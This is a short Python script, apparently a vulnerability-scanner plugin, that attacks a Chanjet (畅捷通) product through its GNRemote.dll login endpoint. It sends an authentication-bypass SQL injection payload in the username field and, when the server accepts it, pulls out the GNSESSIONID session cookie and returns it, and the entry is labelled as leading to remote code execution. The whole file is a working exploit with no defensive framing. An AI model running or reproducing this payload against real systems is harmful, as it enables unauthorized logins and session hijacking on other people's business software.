import requests
import urllib, re

def verify(url):
    relsult = {
        'name': '畅捷通sql注入登录后台rce',
        'vulnerable': False,
        'url': url,
        'attack': False,
    }
    timeout = 3
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'DNT': '1',
    }
    vurl = urllib.parse.urljoin(url, '/GNRemote.dll?GNFunction=LoginServer&decorator=text_wrap&frombrowser=esl')
    payload_data = '''username=%22'%20or%201%3d1%3b%22&password=%018d8cbc8bfc24f018&ClientStatus=1'''
    try:
        rep = requests.post(vurl, headers=headers, verify=False, timeout=timeout, data=payload_data)
        if rep.status_code == 200 and re.search('\{"RetCode":0\}', rep.text) and 'Set-Cookie' in rep.headers.keys():
            GNSESSIONID = re.findall("GNSESSIONID=(.+)", rep.headers['Set-Cookie'])[0]
            relsult['vulnerable'] = True
            relsult['vurl'] = vurl
            relsult['GNSESSIONID'] = GNSESSIONID
        return relsult
    except:
        return relsult